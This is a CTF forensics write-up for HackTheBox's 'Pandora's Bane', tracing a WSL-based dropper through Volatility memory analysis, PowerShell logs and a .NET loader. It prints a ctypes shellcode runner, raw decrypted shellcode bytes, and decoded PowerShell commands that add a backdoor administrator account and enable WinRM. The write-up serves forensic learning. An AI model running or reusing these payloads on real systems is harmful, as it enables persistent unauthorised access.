---
title: "HTB - Pandora's Bane [forensics]"
date: 2023-04-07T18:23:44+10:00
tags: ['forensics', 'hackthebox', 'writeups']
draft: false
---

## Introduction

This was the final Forensics category challenge in HackTheBox's recent CTF, [Cyber Apocalypse — The Cursed Mission](https://www.hackthebox.com/blog/cyber-apocalypse-2023-news).  
My notes won't be super detailed here as I didn't do a whole lot of documentation during the CTF, so this is more just snippets of methodologies applied.
This one felt like a speedrun compared to how much time I spent getting stuck on the final decryption of Interstellar C2 (which I could not do, btw). 

## Volatility

With that said, let's go. When we download the challenge and `unzip`, we are presented with a .raw file
```python
-rw------- 1 kali kali 2288230400 Mar 16 06:50 mem.raw
```
Initially, I had some troubles with vol3 here, so I used [the Windows10 Volatility symbol files from the Japanese CERT's github repo](https://github.com/JPCERTCC/Windows-Symbol-Tables).
After the `git clone` and `mv` of these files into the following folder shown below with the `-s` switch, vol3 started working as intended.
To start, we can check which processes are found in memory, using the `windows.psscan` command
`vol -s volatility3/volatility3/symbols -f mem.raw windows.psscan`
The output here would be too large to display, so I have chosen a few interesting processes and piped the command into egrep for brevity:
```python
5880    5856    bash    0xdb8d3dfa3080  1       -       1       False   2023-03-15 19:47:12.000000      N/A     Disabled
5812    5556    wsl.exe 0xdb8d3e39f080  3       -       1       False   2023-03-15 19:47:12.000000      N/A     Disabled
5644    6700    powershell.exe  0xdb8d40550080  21      -       1       False   2023-03-15 19:49:29.000000      N/A     Disabled
5556    5320    ubuntu.exe      0xdb8d40c5d080  3       -       1       False   2023-03-15 19:47:12.000000      N/A     Disabled
```
We look for low hanging fruit. Windows Subsystem for Linux isn't something that everyone runs, and it seems like a decent place to start for an 'insane' level challenge.
With this hypothesis in mind, we can run a filescan and egrep for the bash history file (using -i for case insensitive and -E for extended match)
`vol -s volatility3/volatility3/symbols -f mem.raw windows.filescan | egrep -i -E "bash_history"`
```python
0xdb8d3deac890.0\Users\Rygnarix\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu_79rhkp1fndgsc\LocalState\rootfs\home\user\.bash_history     216
0xdb8d3deae960  \Users\Rygnarix\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu_79rhkp1fndgsc\LocalState\rootfs\home\user\.bash_history     216
```
With the above virtual address, we can use `windows.dumpfiles` to save the file to our local system
`vol -s ../volatility3/volatility3/symbols -f mem.raw windows.dumpfiles --virtaddr 0xdb8d3deac890`
Inspecting this file shows a few interesting things:
- The attacker/malware cleared bash history
- Numerous discovery commands were run
- Internet connectivity was checked
- Most interestingly, a file was downloaded from windowsliveupdater[.]com/updater and saved to /tmp/.apt-cache
- This file was then made executable and executed

![Contents of bash_history](/static/pandorasbane/Untitled.png)

Searching for this maliciously downloaded file that we have now identified
`vol -s volatility3/volatility3/symbols -f mem.raw windows.filescan | egrep -i -E ".apt-cache"`

```python
0xdb8d3debe9a0.0\Users\Rygnarix\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu_79rhkp1fndgsc\LocalState\rootfs\tmp\.apt-cache      216
0xdb8d3debeb30  \Users\Rygnarix\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu_79rhkp1fndgsc\LocalState\rootfs\tmp\.apt-cache      216
```

## Dropper

After retrieving this with `windows.dumpfiles`, we use `file` to see what this might be

```python
> file apt-cache.dat
apt-cache.dat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=63790c15c356afa5027c5133cc3800a46520ffee, for GNU/Linux 4.4.0, with debug_info, not stripped
```
This is an ELF executable, now we're cooking.

At this point, I inspected this file using a number of 1337 hacker tools such as `strings` and `md5sum`. I did open it in Cutter and checked out some of the functions and other bits, but it's written in Rust and looked decently complicated.
```
> md5sum apt-cache.dat
8d3d0cdb9dbd0aaad66d7d66cb0e4777  apt-cache.dat
```

## THOR APT VirusTotal Comments FTW

Next, I threw the md5 hash at VirusTotal to see if any other CTFers may have uploaded this file already. [We were in luck!](https://www.virustotal.com/gui/file/35bed82720a8e4dc8f33b33fd3427466418aed681b154ab7fa202ebba1bf544b/community)
The first thing I noticed here was that in the Community section, there were two YARA signature matches from THOR APT Scanner (thank you Florian and others!). These hits were 'SUSP_Script_PS1_PE_Injection_Indicators_Jun20_1' and 'SUSP_PS1_Loader_Indicator_Nov21_1, respectively. The first of these referenced [the following article on Covenant C2](https://posts.specterops.io/covenant-v0-5-eee0507b85ba). This C2 framework appeared to be written in dotnet, so I made the assumption that the 'apt-cache' file must be some type of Rust based loader/dropper. In any case, I believe I bypassed a whole part of this challenge thanks to the aforementioned YARA rules. At this point, I put my DFIR hat on and remembered that Windows now does a decent job at logging Powershell by default. These logs can typically be found `C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx`. After a quick search for these using `windows.filescan` piped to `egrep`, we locate the virtual memory location of these logs. 

```python
> sudo vol -s volatility3/volatility3/symbols -f mem.raw windows.filescan | egrep -i -E "Powershell.*Operational"
0xdb8d3fd415d0.0\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx    216

> sudo vol -s volatility3/volatility3/symbols -f mem.raw windows.dumpfiles --virtaddr 0xdb8d3fd415d0
```

## PS-Operational Logs

From here, we can open the logs on a Windows host and see a '4104' ScriptBlock event that looks suspiciously like an executable file being base64 decoded
![ScriptBlockText in PS Operation logs](/static/pandorasbane/Untitled%201.png)

Decoding this using the fantastic [CyberChef](https://gchq.github.io/CyberChef/), we get a Portable Executable file dropped (as indicated by the first two characters shown in the output, MZ). 
![PE file as denoted by the bytes MZ](/static/pandorasbane/Untitled%202.png)

We notice that this is a DotNET file so we can open this in `dnSpy`. There is a ‘shellcode’ section and a ‘key’ section. We need to write a python script that can decode this. Before we do this, we need to sanitize the bytes by changing the values listed as “byte.MaxValue” to “255” as identified by the const found in the code (double clicking in dnSpy). 

![const showing MaxValue as 255](/static/pandorasbane/Untitled%203.png)

## ChatGPT to the Rescue

I will confess that I asked ChatGPT for a hand here, as I am still fairly new to learning Python. With our friends help, we get something that looks like the following

```python
import ctypes

# The shellcode bytes and key components
shellcode_bytes = bytearray([66, 124, 39 ...]) # trimmed to fit
key = bytearray([
    190, 148, 165, 241, 158, 115, 44, 159,
    247, 130, 138, 33, 108, 203, 195, 221,
    202, 179, 173, 72, 204, 54, 105, 202,
    77, 221, 232, 75, 67, 65, 42, 201
])

# Decrypt the shellcode
for i in range(len(shellcode_bytes)):
    shellcode_bytes[i] = shellcode_bytes[i] ^ key[i % 32]

# Convert the shellcode to a ctypes byte array
shellcode = ctypes.create_string_buffer(shellcode_bytes)

# Create a function pointer to the shellcode
shellcode_func = ctypes.cast(shellcode, ctypes.CFUNCTYPE(ctypes.c_char_p))

# Call the shellcode and print the result
result = shellcode_func()
print(result.decode())
```

The script sort of errored out, but it's good enough 😎 - the base64 powershell encoded command can then be decoded in terminal or on CyberChef to find our flag.

```python
> python3 decryptor_sc.py

Traceback (most recent call last):
  File "/home/kali/Documents/CTF/HTB/decryptor_sc.py", line 18, in <module>
    shellcode = ctypes.create_string_buffer(shellcode_bytes)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/ctypes/__init__.py", line 66, in create_string_buffer
    raise TypeError(init)
TypeError: bytearray(b'\xfc\xe8\x82\x00\x00\x00`\x89\xe51\xc0d\x8bP0\x8bR\x0c\x8bR\x14\x8br(\x0f\xb7J&1\xff\xac<a|\x02, \xc1\xcf\r\x01\xc7\xe2\xf2RW\x8bR\x10\x8bJ<\x8bL\x11x\xe3H\x01\xd1Q\x8bY \x01\xd3\x8bI\x18\xe3:I\x8b4\x8b\x01\xd61\xff\xac\xc1\xcf\r\x01\xc78\xe0u\xf6\x03}\xf8;}$u\xe4X\x8bX$\x01\xd3f\x8b\x0cK\x8bX\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89D$$[[aYZQ\xff\xe0__Z\x8b\x12\xeb\x8d]j\x01\x8d\x85\xb2\x00\x00\x00Ph1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2Vh\xa6\x95\xbd\x9d\xff\xd5<\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00S\xff\xd5powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand JABwAGEAcwBzAHcAbwByAGQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgACIAUwB1AHAAMwByAFMAMwBjAHUAcgAzAFAAQAA1AHMAVwAwAHIAZAAhACEAIgAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUADQAKAE4AZQB3AC0ATABvAGMAYQBsAFUAcwBlAHIAIAAiAEEAbgB1AGIAaQBzACIAIAAtAFAAYQBzAHMAdwBvAHIAZAAgACQAcABhAHMAcwB3AG8AcgBkACAALQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAiAEgAVABCAHsAdwBzAGwAXwBvAHgAMQBkADQAdAAxADAAbgBfADQAbgBkAF8AcgB1AHMAdAB5AF8AbQAzAG0AMAByAHkAXwA0AHIAdAAxAGYANABjAHQAcwAhACEAfQAiAA0ACgBBAGQAZAAtAEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAIAAtAEcAcgBvAHUAcAAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACIAIAAtAE0AZQBtAGIAZQByACAAIgBBAG4AdQBiAGkAcwAiAA0ACgBFAG4AYQBiAGwAZQAtAFAAUwBSAGUAbQBvAHQAaQBuAGcAIAAtAEYAbwByAGMAZQANAAoAUwB0AGEAcgB0AC0AUwBlAHIAdgBpAGMAZQAgAFcAaQBuAFIATQANAAoAUwBlAHQALQBTAGUAcgB2AGkAYwBlACAAVwBpAG4AUgBNACAALQBTAHQAYQByAHQAdQBwAFQAeQBwAGUAIABBAHUAdABvAG0AYQB0AGkAYwA=\x00')
```
Here is the decoded `-EncodedCommand` from the above output
```python
$password = ConvertTo-SecureString "Sup3rS3cur3P@5sW0rd!!" -AsPlainText -Force
New-LocalUser "Anubis" -Password $password -Description "HTB{wsl_ox1d4t10n_4nd_rusty_m3m0ry_4rt1f4cts!!}"
Add-LocalGroupMember -Group "Administrators" -Member "Anubis"
Enable-PSRemoting -Force
Start-Service WinRM
Set-Service WinRM -StartupType Automatic
```
## Win

![Flags!](/static/pandorasbane/Untitled%205.png)

Reach out if you found a different way to solve this, would love to hear from you.
[@ventdrop](https://twitter.com/ventdrop)